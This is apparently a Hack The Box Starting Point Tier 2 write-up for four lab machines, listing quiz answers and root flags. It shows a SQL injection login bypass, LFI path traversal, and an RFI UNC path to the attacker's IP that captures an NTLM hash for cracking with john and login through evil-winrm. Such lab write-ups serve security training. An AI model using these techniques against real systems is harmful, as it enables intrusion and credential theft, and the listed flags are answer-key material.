# HTB: Starting point tier 2

## Machine: Appointment (11 tasks)

### Task 1: What does the acronym SQL stand for?

    A: Structured Query Language

### Task 2: What is one of the most common type of SQL vulnerabilities?

    A: SQL Injection

### Task 3: What is the 2021 OWASP Top 10 classification for this vulnerability?

    A: A03:2021-Injection

### Task 4: What does Nmap report as the service and version that are running on port 80 of the target?

Using nmap to scan target:

    A: Apache httpd 2.4.38 ((Debian))

### Task 5:What is the standard port used for the HTTPS protocol?

    A: 443

### Task 6: What is a folder called in web-application terminology?

    A: directory

### Task 7: What is the HTTP response code is given for 'Not Found' errors?

    A: 404

### Task 8: Gobuster is one tool used to brute force directories on a webserver. What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?

    A: dir

### Task 9: What single character can be used to comment out the rest of a line in MySQL?

    A: #

### Task 10: If user input is not handled carefully, it could be interpreted as a comment. Use a comment to login as admin without knowing the password. What is the first word on the webpage returned?

Access the website through the machine IP:

With the hint from all above questions, this will be a SQL injection task:

I try input username: `admin' #` and password can be anything.

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c1_10_1.png?raw=true" alt="image">
</div>

After pressed login, it redirect to this page:

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c1_10_2.png?raw=true" alt="image">
</div>

    A: Congratulations

### Task 11: Submit root flag

#### Flag:
    e3d0796d002a446c0e622226f42e9672


---

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c1_f.png?raw=true" alt="image">
</div>

---

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c1_e.png?raw=true" alt="image">
</div>

---

## Machine: Sequel

### Task 1 During our scan, which port do we find serving MySQL?

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c2_1.png?raw=true" alt="image">
</div>

We have found that the port is `3306` and run service named ` 5.5.5-10.3.27-MariaDB-0+deb10u1`

    A: 3306
### Task 2 What community-developed MySQL version is the target running?
    A: MariaDB
### Task 3 When using the MySQL command line client, what switch do we need to use in order to specify a login username?

#### Note: 
To connect to database we need to install `mysql` or `mariadb` on local machine:

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c2_3.png?raw=true" alt="image">
</div>

    A: -u
### Task 4 Which username allows us to log into this MariaDB instance without providing a password?
    A: root
### Task 5 In SQL, what symbol can we use to specify within the query that we want to display everything inside a table?
    A: *
### Task 6 In SQL, what symbol do we need to end each query with?
    A: ;
### Task 7 There are three databases in this MySQL instance that are common across all MySQL instances. What is the name of the fourth that's unique to this host?

Connect to database:

Use: `mysql -h {target ip} -u {user}` add option `--skip-ssl` if you encounter error `ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it`

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c2_7_1.png?raw=true" alt="image">
</div>


Use: 

    `show databases;` to show all database
    `use {database};` to use the database
    `show tables;` to show all tables
    `select * from {table}` to display all table contents

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c2_7_2.png?raw=true" alt="image">
</div>

The three common databases accross all MySQL instance are: `information_schema, mysql , performance_schema` and the `htb` is the table we need

    A: htb

### Task 8 Submit root flag

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c2_f.png?raw=true" alt="image">
</div>

#### Flag:
    7b4bec00d1a39e3dd4e021ec3d915da8


---



<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c2_8.png?raw=true" alt="image">
</div>

---

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c2_e.png?raw=true" alt="image">
</div>

---

---

## Machine: Crocodile
### Task 1

What Nmap scanning switch employs the use of default scripts during a scan?


<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c3_1.png?raw=true" alt="image">
</div>


    A: -sC

### Task 2

What service version is found to be running on port 21?


<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c3_2.png?raw=true" alt="image">
</div>

We see that the version of the service is `vsftpd 3.0.3` and that it allow anonymous login with `FTP code 230`

    A: vsftpd 3.0.3

### Task 3

What FTP code is returned to us for the "Anonymous FTP login allowed" message?

    A: 230

### Task 4

After connecting to the FTP server using the ftp client, what username do we provide when prompted to log in anonymously?

As suggest above from the ftp we will use:

    A: anonymous

### Task 5

After connecting to the FTP server anonymously, what command can we use to download the files we find on the FTP server?

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c3_4.png?raw=true" alt="image">
</div>

    A: get

### Task 6

What is one of the higher-privilege sounding usernames in 'allowed.userlist' that we download from the FTP server?

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c3_5.png?raw=true" alt="image">
</div>

After downloaded the files, using `cat` will show the list of allowed users and we see that there an `admin` user that seems to be the highest privilige. We also see the password of `admin` is seems to `rKXM59ESxesUFHAd`

    A: admin

### Task 7

What version of Apache HTTP Server is running on the target host?

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c3_6.png?raw=true" alt="image">
</div>

    A: Apache httpd 2.4.41

### Task 8

What switch can we use with Gobuster to specify we are looking for specific filetypes?

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c3_7.png?raw=true" alt="image">
</div>

    A: -x

### Task 9

Which PHP file can we identify with directory brute force that will provide the opportunity to authenticate to the web service?

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c3_8.png?raw=true" alt="image">
</div>

Webpage on this ip. If there is a webpage, and using PHP as the question suggest, there might be `login.php`

    A: login.php

Attempt to login with the credentials above 

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c3_8_2.png?raw=true" alt="image">
</div>

### Submit Flag

Submit root flag

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c3_f.png?raw=true" alt="image">
</div>

We successfull access `admin` dashboard

#### Flag

    c7110277ac44d78b6a9fff2232434d16

---

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c3_e.png?raw=true" alt="image">
</div>

--- 

---

## Machine: Responder

### Task 1

When visiting the web service using the IP address, what is the domain that we are being redirected to?

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_1.png?raw=true" alt="image">
</div>

When visiting the web service using ip address, we see that it domain is `unika.htb`
And the errpr is `DNS_PROBE_POSSIBLE` means that the resolver was unable to find DNS records for the requested hostname. In order to view the page we have to edit the `hosts` file on local machine to resolve the domain.

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_1_2.png?raw=true" alt="image">
</div>

Successfully accessed the webpage

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_1_3.png?raw=true" alt="image">
</div>

    A: unika.htb

### Task 2

Which scripting language is being used on the server to generate webpages?

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_2.png?raw=true" alt="image">
</div>

We can see that the scripting language for the server is `php` version `8.1.1`. And target machine OS is Windows x64

    A: php

### Task 3

What is the name of the URL parameter which is used to load different language versions of the webpage?

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_3.png?raw=true" alt="image">
</div>

Attemp to change to another language we see the `page=german.html` parameter

    A: page

### Task 4

Which of the following values for the `page` parameter would be an example of exploiting a Local File Include (LFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

Base on this: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion

We try `page=../../../../../../../../windows/system32/drivers/etc/hosts`

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_4.png?raw=true" alt="image">
</div>

As we see, we can access the hosts file from the target machine 

    A: ../../../../../../../../windows/system32/drivers/etc/hosts

### Task 5

Which of the following values for the `page` parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: "french.html", "//10.10.14.6/somefile", "../../../../../../../../windows/system32/drivers/etc/hosts", "minikatz.exe"

Base on this: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion

We try `//10.10.14.6/somefile`

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_5.png?raw=true" alt="image">
</div>

We see that it do attempt to open the file `somefile`

    A: //10.10.14.6/somefile

### Task 6

What does NTLM stand for?

    A: New Technology LAN Manager

Which comprises a group of security protocols designed for Microsoft Windows. It employs a challenge-response mechanism to authenticate clients and servers. However, Microsoft advises against using NTLM for contemporary applications because of its insufficient encryption.

### Task 7

Which flag do we use in the Responder utility to specify the network interface?

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_7.png?raw=true" alt="image">
</div>

    A: -I


* Here at this point i encoutered some error regarding ports when running responder on wsl so i switch to kali

Use: `ifconfig` to see the interface connect to Starting point

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_2.png?raw=true" alt="image">
</div>

My interface is `tun0`

Using responder run this cmd `responder -I {interface to startingpoint}


<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_7_2b.png?raw=true" alt="image">
</div>

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_7_2a.png?raw=true" alt="image">
</div>

When listen to SMB respond, change the `//10.10.14.6/somefile` in the suggesstions to  `//{responder ip}/somefile`

When we get the hash response , save to .txt file to prepare to run it through `john`

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_7_3.png?raw=true" alt="image">
</div>

### Task 8

There are several tools that take a NetNTLMv2 challenge/response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as `john`, but the full name is what?.

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_8.png?raw=true" alt="image">
</div>

    A: john the ripper


Using: `john --wordlist={your word list or rockyou.txt} {responder hash}` to find the password

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_8_2.png?raw=true" alt="image">
</div>

We found the admin password is `badminton`

### Task 9

What is the password for the administrator user?


    A: baminton

### Task 10

We'll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?

Now we using `evil-winrm` to coonnect to target machine :

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_10.png?raw=true" alt="image">
</div>

Traversing through the directories...

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_10_2.png?raw=true" alt="image">
</div>

We found nothing until hit the `Users` directory we see some user named `mike` , cd'd to it
We found the flag.txt, `cat` it

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_f.png?raw=true" alt="image">
</div>

### Submit Flag

Submit root flag

#### Flag

    ea81b7afddd03efaa0945333ed147fac

---

<div align="center">
  <img src="https://github.com/Witnull/HackmdWriteup/blob/main/HTB/StartingPointT2_img/c4_e.png?raw=true" alt="image">
</div>

---

---


